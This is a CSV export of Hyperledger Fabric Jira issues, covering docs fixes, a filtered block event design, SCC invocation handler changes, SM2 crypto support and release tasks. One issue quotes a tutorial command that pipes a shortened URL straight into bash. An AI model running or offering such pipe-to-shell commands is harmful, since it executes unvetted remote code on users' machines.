Delete dead code from ""bddtests/regression"" folder.",,bmos299,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9r3:",,,,,,,,,,,,,,,,,,,,,,,bmos299,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jul/17 11:48 PM;rameshthoomu;Patch is in-review. https://gerrit.hyperledger.org/r/#/c/11945/;;;","27/Jul/17 12:58 AM;bmos299;Thank you [~rameshthoomu].;;;","31/Aug/17 11:20 PM;rameshthoomu;Patch is merged now..;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove externally linked images from doc,FAB-5479,19500,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nickgaski,nickgaski,nickgaski,27/Jul/17 12:04 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,23/Mar/18 5:33 AM,,,,,,fabric-docs,,,,,,0,Documentation,,,,,,clean up arch-deep-dive to include images from source rather than external links to personal URLs. ,,nickgaski,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9rb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,nickgaski,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add wrapper hooks for allowing the use of SDK and tools for calling chaincode functions,FAB-5480,19501,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,27/Jul/17 1:06 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Sep/17 2:16 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"The possibility to test multiple SDKs and multiple tools in different systems using behave should be in place. There should be hooks that will allow the mapping of 
* installing chaincode
* instantiating chaincode
* creating a channel
* fetching a channel
* joining a channel
* invoking chaincode
* querying chaincode
* updating chaincode",,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9rj:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
filtered block event with minimal information,FAB-5481,19504,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,muralisr,muralisr,27/Jul/17 2:51 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,28/Feb/18 2:50 PM,,,,,,fabric-peer,,,,,,1,review-needed,sdk,,,,,"Block events deliver entire block with all the transactions and information in them. Currently only RW/sets are removed before sending out the block event. This proposal is to create another event type (FilteredBlockEvents ?) to contain only information such as

\{transactionID, chaincode event name}

as part of the minimal set. This allows clients to register and obtain the filtered information for the minimal set which they can use to do further queries to the fabric with.

Rough sketch of FilteredBlockEvent proto for protos/peer/events.proto
{code:java}
FilteredBlock
   -> uint64 number
   -> string channel_id
   -> repeated FilteredTransaction filtered_transaction
      -> string txid
      -> TxValidationCode tx_validation_code
      -> FilteredAction filtered_action
          -> ChaincodeEvent ccevent
             -> string txid
             -> string ccid
             -> string ccEventName
             -> bytes payload - nilled out in this filtered transaction{code}
This can then be added to a SignedEvent (defined in protos/peer/events.proto) if user registers and wants signed events. We should also do the same for regular block events, which are currently sent unsigned.

ChaincodeEvent may be nil, hence the need for the txid field in the FilteredTransaction. ChaincodeEvent is reused to avoid inventing a new structure without the txid field.
  ",,muralisr,rickr,ScottMoynes,troyronda,wlahti,wutongtree,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3134,FAB-6450,FAB-6243,,,,,,,,,,,,,,FAB-7069,FAB-7419,,,FAB-5695,FAB-6539,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9rr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,muralisr,rickr,ScottMoynes,troyronda,wlahti,wutongtree,yacovm,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,dev,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jul/17 7:11 PM;yacovm;I don't see how this solves the problem of FAB-3134.
If we create another event type and clients can subscribe for both event types - isn't that a problem?

Furthermore - I don't see the merit in having a custom crafted event. 
* If we want to make the life of the SDK code easier - can just encode the required block events as JSON strings, no?
* If we want to make the life of the peer easier - we can just copy the block aside, and delete its un-needed fields before it is sent to the subscribers.

FAB-2679 states that they want the ability to see RW sets - to be toggle-able. 

What do you guys think of the following idea?
* We keep the original event structure, so SDKs won't be need to write code to adjust
* We have 2 implementations in the peer of a function that does filtering on the block - it would filter out the fields that are confidential.
** a no-op method for those deployments that want to see the RWsets in blocks
** a special logic that would filter out those fields for those deployments where they don't want this to be visible to clients.
* At runtime, the ""right"" implementation would be loaded via reflection and would be used.

Thoughts? [~binhn] [~mastersingh24] [~muralisr] [~wlahti] [~troyronda]

PS : the pluggable SCC work I'm doing would make this a no-brainer to use - the code for plugging it into the events would be something like:
{code}
filterSCC := registry.Lookup(""eventsFilter"")
block = filterSCC.Filter(block)
return block
{code}

and the implementation of the filterSCC would be chosen at peer startup via a config file.
I expect to have this infrastructure in place by middle of this week. ;;;","29/Jul/17 11:55 PM;muralisr;[~yacovm] The problem with Block-event-only is it's all or nothing. With two events and ACL on Event types, orgs can control who can get what.  ie, orgs can put strict ACL on BlockEvent (or even DENY ALL) and different ACL on FilteredBlockEvent. Thus the peer can send events only to the authorized clients. 

We did consider reusing the Block as payload with all fields except benign ones nilled out.  Given the horrendous nested structure before we can get to these fields, a straightforward FilteredBlock with is more usable even if there's some initial pains for the SDK. We can revisit this if everyone thinks its better to just use Block as the payload type.

;;;","30/Jul/17 1:49 AM;yacovm;{quote}With two events and ACL on Event types, orgs can control who can get what. ie, orgs can put strict ACL on BlockEvent (or even DENY ALL) and different ACL on FilteredBlockEvent. Thus the peer can send events only to the authorized clients. {quote}

All right, ACL on selecting what fields of the block are allowed to be sent is also a way of achieving both the goals of FAB-2679 and FAB-3134. The JIRA description didn't mention this (or - have I just misread?)
As long as the decision takes place in the peer and not in the client (and a non authorized client cannot affect this decision), that preserves security.

However - if we go to the ACL way (which I think is also fine) in order to preserve security a channel admin would need to configure the channel after its creation in any case, won't he/she? This is additional management overhead.
* If by default the policy would be that RWsets are not sent - some admins would need to configure the channel to enable inclusion of them in the Block events.
* If by default the policy would be that RWsets are sent - this poses as a security concern too, because if one forgets to change it - the event hub would leak RWsets.;;;","30/Jul/17 10:55 AM;muralisr;[~yacovm] 
 This JIRA is created for FAB-3621 which is basically about restricting what users can see. For that purpose, not sending RW sets with block events (current behavior) is a good thing.

FAB-2679 (requirement to send RW sets with the block event) is not a requirement for FAB-3621 (quite the opposite). This would not be hard to add once the ACL framework is in place. One simple way would be to treat BlockEvent's RWSet as a resource and define an ACL policy for it. When we send the block out we would set the RWSet for those clients satisfying the policy. Let us not mix FAB-2679 with FAB-3621 but treat it separately.

_a channel admin would need to configure the channel after its creation in any case, won't he/she?_
 Yes, by sending invokes  to RSCC. This is the general mechanism to update policies for the channel described in the doc. Note that we are also considering a one time initialization of RSCC from the channel config at join time. If this goes through, clients can avoid that overhead. Details for that to be ironed out (with help from [~jyellick]).;;;","31/Oct/17 11:51 AM;rickr;Why the need to nil out the ccevent payload ? This is just the what the chaincode put in the event message. If the chaincode didn't want it made available it could not put anything in there in the first place.

If we're not going to include all then why not just nil out ccevent for filtered blocks? Seems all are nothing rather than just part there. Not sure what value there is to an application not getting what the CC actually sent with the event would be.
;;;","11/Jan/18 8:32 AM;Clayton Sims;removing 1.1 label, tracked under 7419;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document the connectivity requirements for a Hyperledger Fabric network,FAB-5482,19505,28766,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,mastersingh24,mastersingh24,27/Jul/17 2:51 AM,23/Jan/20 6:56 AM,28/Oct/23 3:00 AM,23/Jan/20 6:56 AM,v1.0.0,,,,,fabric-docs,,,,,,0,stale-item,,,,,,"Here's an example of Q&A around this:

_+Question:+  I apologize in advance if this is a bit of a noob question ... but what is the typical backplane for orgs on completely separate networks/providers to be able to connect to the same Fabric network? ... are the peer nodes internet-connected? is there some sort of site-to-site VPN connectivity between the orgs? do we have any best practices/samples that show this as the current docker-compose samples are designed for running the entire network on a single host_

_+Answer:+  It's a good question although I think the answer is fairly simple if you think about it this way:_

_1) Peer nodes host and run chaincode_
_2) Client applications submit proposals to one or more peer nodes in order to obtain endorsements_
_3) Client applications package signed proposals together and submit them to ordering nodes_
_4) Peer nodes connect to ordering nodes in order to receive batches (blocks) of transactions which they then commit and validate_
_5) Peer nodes can communicate with peer nodes from other organizations via the gossip protocol_

_So in the end, that leaves you with the following:_

_1) Peer nodes must expose endpoints which are accessible from client applications (and from peers from other orgs if gossip is enabled)_
_2) Ordering nodes must expose endpoints which are accessible from client applications and peer nodes_

_Fabric supports TLS for client apps, peer nodes and ordering nodes. So it will all depend on the security requirements of the various organizations which are part of a Fabric network as to whether to connect solely using TLS over the public internet or whether they need a VPN / private network / leased line / etc_

 ",,mastersingh24,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzwu07:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:56 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Demonstrate Organization Unit usage wrt to policy settings,FAB-5483,19506,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,jeffgarratt,jeffgarratt,jeffgarratt,27/Jul/17 3:06 AM,23/Jan/20 6:56 AM,28/Oct/23 3:00 AM,23/Jan/20 6:56 AM,,,,,,,,,,,,0,quality,stale-item,,,,,Show how to use the concept of Organization Units wrt to configuring policy.,,ChaoZhang99,jeffgarratt,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1141,,,,,,,,,"1|hzy9rz:",,,,Unset,,,,,,,13.0,Unset,,,,,,,,,,,ChaoZhang99,jeffgarratt,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jul/17 3:08 AM;jeffgarratt;Spoke with [~jyellick], will work glean more information from [~ales] wrt to OU proto buf structures and values.;;;","23/Jan/20 6:56 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation is wrong for Windows 10,FAB-5484,19507,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,lehors,lehors,lehors,27/Jul/17 3:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jul/17 4:14 AM,v1.0.0,,,v1.0.1,v1.1.1,fabric-docs,,,,,,0,,,,,,,"The current documentation instructs Windows users to use Git Bash but this is not what people should use on Windows 10. As reported by one user on Stackoverflow, one should really use the Docker Quickstart Terminal:

[https://stackoverflow.com/questions/45316044/please-troubleshoot-error-message-i-am-facing-during-follwing-getting-started]

In fact, this is also true for Windows 7 users using Dockert Toolbox.",,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9s7:",,,,,,,,,,,,,,,,,,,,,,,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Hash in chaincode docker image name should be computed before replacing any characters,FAB-5485,19508,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,27/Jul/17 4:58 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Aug/17 12:38 AM,,,,v1.1.1,,fabric-peer,,,,,,0,,,,,,,"FAB-5329 recently fixed an issue with chaincode container names where lowercasing the name resulted in a chaincode instantiated later taking over the container name and destroying the earlier chaincode's container. This was done by adding a hash to the image name and returning the container name to include the capitalization from the end user. 

The problem here arises because special characters in the peer and network ids are replaced with ""-"" before computing the hash. This can lead to the same issue as before since peer id ""peer-2"" and ""peer*2"" would convert to the same peer id in the container name. ",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9sf:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Samples tutorial is missing a sudo,FAB-5486,19509,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,lucasbm88,lucasbm88,lucasbm88,27/Jul/17 7:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Oct/17 12:53 AM,,,,,,fabric-docs,,,,,,0,,,,,,,"The following command on the samples documentation is not working properly on most environments:

curl -sSL https://goo.gl/iX9dek | bash

What happens is that, by default, a docker-ce installation only works with sudo. One will not be able to run docker commands without sudo unless he is root or has configured docker for it (not straightforward).

Said that, the previous command will fail in most environments, because the script being executed run docker commands.",,ChristopherFerris,lucasbm88,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9sn:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,lucasbm88,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Aug/17 5:09 PM;mastersingh24;[~lucasbm88]  

Maybe we can add a note about this for Linux users.  For macOS and Windows, this is not an issue.

On Linux, I've always add my user ID to the ""docker"" group;;;","08/Aug/17 1:42 AM;ChristopherFerris;I have added a script to the fabric-samples/bin directory that will allow the user control over the download of docker images independent of installing the binaries [https://gerrit.hyperledger.org/r/c/11843/.|https://gerrit.hyperledger.org/r/c/11843/] It should be available in the default branch on GH when 1.0.1 is formally released.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ability to call one SCC from another without providing the channel,FAB-5487,19510,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,Baha-sk,Baha-sk,Baha-sk,27/Jul/17 8:21 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,19/Nov/17 5:59 AM,v1.0.0,,,v1.1.1,,fabric-peer,,,,,,0,,,,,,,"Failing scenario:
 * client calls SCC1 without channel
 * SCC1 calls SCC2 without channel - this call fails

Currently when a client calls a SCC that invokes another SCC, the peer return the following error:

[chaincode] isValidTxSim -> ERRO 297 [3e126b84]No ledger context for INVOKE_CHAINCODE. Sending ERROR

 

But when the client calls a UCC that invokes a SCC, no error is thrown.

 

 

By digging for the root cause of the SCC to SCC invoke error, it was found that in the handler, the isValidTxSim function throws an error due to txsimulator = nil in the txContext. Obviously it is nil as SCC don't need a simulated transaction because of their nature of not writing info to the ledger.

 

the fix to all inter SCC invoking is to verify if ChainID is not being empty along with txsimulator != nil condition. Please comment if this fix is feasible or if it will impact current invoking.",,aleksandar.likic,Baha-sk,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5688,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycuv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,aleksandar.likic,Baha-sk,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jul/17 1:09 PM;muralisr;[~Baha-sk] isValidTxSim is called in contexts where a ledger is a must (e.g., for doing a GetState). System chaincode can call ledger operations just like user chaincode. Also  INVOKE_CHAINCODE uses the tx simulator too in general. Adding the ChainID check to isValidTxSim doesn't look to be a good idea. The  ""enterBusyState"" should be modified for the the narrow case of INVOKE_CHAINCODE that doesn't need txsimulator.;;;","01/Aug/17 3:35 AM;Baha-sk;The logic in ""enterBusyState"" requires to check if the current call is made by an SCC to avoid calling handler.isValidTxSim.

 

there is already a flag created in enterBusyStatue for this purpose (isscc). It is created way below isValidTxSim call. The solution is to pull that flag up in the function in order to verify if isValidTxSim can be called.

 

in short, this call:

txContext, triggerNextStateMsg = handler.isValidTxSim(msg.Txid, ""[%s]No ledger context for %s. Sending %s"",
 shorttxid(msg.Txid), msg.Type.String(), pb.ChaincodeMessage_ERROR)

 

will become:

if !isscc \{
       txContext, triggerNextStateMsg = handler.isValidTxSim(msg.Txid, ""[%s]No ledger context for %s. Sending %s"",
 shorttxid(msg.Txid), msg.Type.String(), pb.ChaincodeMessage_ERROR)
} else \{
       txContext = handler.getTxContext(msg.Txid)
}

 

with this change, I'm able to invoke an SCC without the peer having to create and join a channel. The change will be introduced with our pluggable SCC poc. Any comments about this solution are welcome.;;;","04/Aug/17 6:43 AM;Baha-sk;a minor change to the conditions proposed above, I recommend removing the else conditions and make the if condition above for any CC that is not an SCC AND ChainID == """" to avoid impacting any other case requiring isValidTxSim validation. The conditions in my previous comment above will therefore be:

txContext = handler.getTxContext(msg.Txid)
 if !(isscc && txContext.chainID == """")\{
         txContext, triggerNextStateMsg = handler.isValidTxSim(msg.Txid, ""[%s]No ledger context for %s. Sending %s"", shorttxid(msg.Txid), msg.Type.String(), pb.ChaincodeMessage_ERROR)
 };;;","11/Aug/17 11:36 PM;aleksandar.likic;Moved to be a part of FAB-5688, as it logically belongs there.;;;","28/Oct/17 4:21 AM;muralisr;[~aleksandar.likic] [~Baha-sk] One of the long pending tasks for chaincode framework is to remove the FSM from the chaincode framework that was needed for serialization in 0.5 - https://jira.hyperledger.org/browse/FAB-5424.  Removing that up will also help clean other parts of that code. Rather than fix issues in the existing code, suggest we wait till that cleanup is done (within a couple of weeks tops). As your fix is narrow, it shouldn't be difficult to re-apply it once that work is done. ;;;","28/Oct/17 6:04 AM;Baha-sk;Thanks for the updated [~muralisr]

according to Gari, the logic of our fix may not work (i.e. check if isscc and ChainID=="""")..

 

I'm still checking the CC2CC test case in the Unit-test to see why it fails with our logic. ;;;","31/Oct/17 12:33 AM;Baha-sk;[~muralisr], I've fixed the segmentation fault error in the commit and unit tests are now passing.

 

The negative scenario invoking VSCC was causing the failure. Please review the latest change and provide your suggestions/recommendation.

 

Thank;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improving benchmark test based on user experience,FAB-5494,19517,19124,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Lowest,Won't Do,,guoger,guoger,27/Jul/17 11:44 AM,30/Jul/19 10:06 AM,28/Oct/23 3:00 AM,30/Jul/19 10:06 AM,,,,,,,,,,,,0,,,,,,,"While using benchmark test, minor improvements could be made for better UX. This JIRA is used to keep track of them.

- On some systems, `file ledger` is the major bottleneck due to extensive disk IO. consequently, ordering performance improvement may not be observable. We should document this in the code and suggest to use `ram ledger` when interested in ordering service only.",,guoger,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9u7:",,,,,,,,,,,,,,,,,,,,,,,guoger,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 10:06 AM;mastersingh24;Raft is the strategic option now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support China Crypto Standard (SM2),FAB-5496,19521,,Story,In Progress,FAB,Fabric,software,denyeart,,,Medium,,davidkhala,baohua,baohua,27/Jul/17 6:18 PM,05/Jun/21 12:26 AM,28/Oct/23 3:00 AM,,,,,Future,,fabric-crypto,,,,,,6,crypto,,,,,,"Enable SM2 support in fabric as a new crypto suite.

TWGC and IBM China team are planing to help organize the development on the feature. An online discussion will happen on the TWGC meeting at Aug 2.

Welcome for more advice and comments.

 

Ref:
 * SM2 is an ECC based public-private crypto algorithm: [https://zh.wikipedia.org/wiki/SM2]",,baohua,daijianw,davidkhala,flyinox,guce,guoger,guolidong,hello2mao,henryhs,huxd,matingwei,qiang0723,qsmen,sharpyuhang,silentspark,smartheye,sykesm,tkuhrt,warm3snow,weeds,wutongtree,xixuejia,,,,,,,,";13/Aug/20 9:30 PM;davidkhala;720",,,0,720,,115200,115200,720,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9v3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,daijianw,davidkhala,flyinox,guce,guoger,guolidong,hello2mao,henryhs,huxd,matingwei,qiang0723,qsmen,sharpyuhang,silentspark,smartheye,sykesm,tkuhrt,warm3snow,weeds,wutongtree,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 8:48 AM;baohua;[~elli-androulaki] is currently leading the crypto component, please invite him as reviewer for the following patchsets.

Thanks!;;;","06/Dec/17 11:51 AM;henryhs;Elli is she:);;;","07/Dec/17 12:31 PM;baohua;A design doc is drafted at https://docs.google.com/document/d/1Qrt2PcHvkj9NHeQyY7HJ9pM1uHD00e3cxBMKb0z7bos/edit?usp=sharing

welcome to update or comment.;;;","03/Jan/18 9:51 PM;weeds;Any chance I can get access to the google document?  I tried to access it and it said denied.

 ;;;","03/Jan/18 11:48 PM;baohua;[~weeds], update the link. pls retry, thanks!;;;","23/Jan/20 6:56 AM;sykesm;Stale;;;","25/Jul/20 6:50 PM;davidkhala;Over 2 years past, Chinese community is still looking for a generic Chinese crypto solution.
It is recently reactive to discuss, design and collaborate within TWGC

Wiki 
https://github.com/Hyperledger-TWGC/fabric-gm-wiki;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create 1.0.1 patch for fabric,FAB-5497,19522,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,27/Jul/17 6:40 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Aug/17 8:11 PM,,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,"1) cherry-pick CRs targetted for patch

2) Squash cherry-picks into single commit

3) Submit for review against release branch",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5531,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jul/17 2:21 AM;mastersingh24;changelog.sh;https://jira.hyperledger.org/secure/attachment/11787/changelog.sh","29/Jul/17 2:21 AM;mastersingh24;fabric-1.0.1-cherrypick.sh;https://jira.hyperledger.org/secure/attachment/11786/fabric-1.0.1-cherrypick.sh",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9vb:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,release-1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jul/17 2:21 AM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/12019/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing RLock in on gossip service - StatusChangeFactory,FAB-5498,19524,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,27/Jul/17 8:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jul/17 5:30 PM,,,,v1.0.1,,fabric-gossip,,,,,,0,,,,,,,"There is a [map access|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L286] that isn't protected by a lock that was introduced in a [recent commit|https://gerrit.hyperledger.org/r/#/c/11751/] 

